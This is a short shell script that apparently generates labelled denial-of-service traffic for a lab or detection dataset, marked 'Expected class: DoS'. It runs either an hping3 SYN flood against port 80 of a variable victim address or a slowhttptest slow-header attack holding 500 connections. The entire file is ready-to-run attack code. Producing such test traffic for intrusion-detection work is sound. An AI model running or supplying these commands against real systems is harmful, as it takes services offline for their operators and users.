#!/bin/sh
# Expected class: DoS. Usage: dos.sh [syn [hping3-interval]|slow]  (default: syn flood, 20 s)
# The interval (for example u500 = one SYN every 500 us) limits the rate; without it, --flood.
. "$(dirname "$0")/common.sh"
case "${1:-syn}" in
  syn)  if [ -n "${2:-}" ]; then timeout 20 hping3 -S -i "$2" -p 80 "$VICTIM_IP"
        else timeout 20 hping3 -S --flood -p 80 "$VICTIM_IP"; fi ;;
  slow) slowhttptest -c 500 -H -g -o /tmp/slow -i 10 -r 100 -t GET -u "http://$VICTIM_IP/" -x 24 -p 3 ;;
  *) echo "usage: $0 [syn [hping3-interval]|slow]" >&2; exit 1 ;;
esac
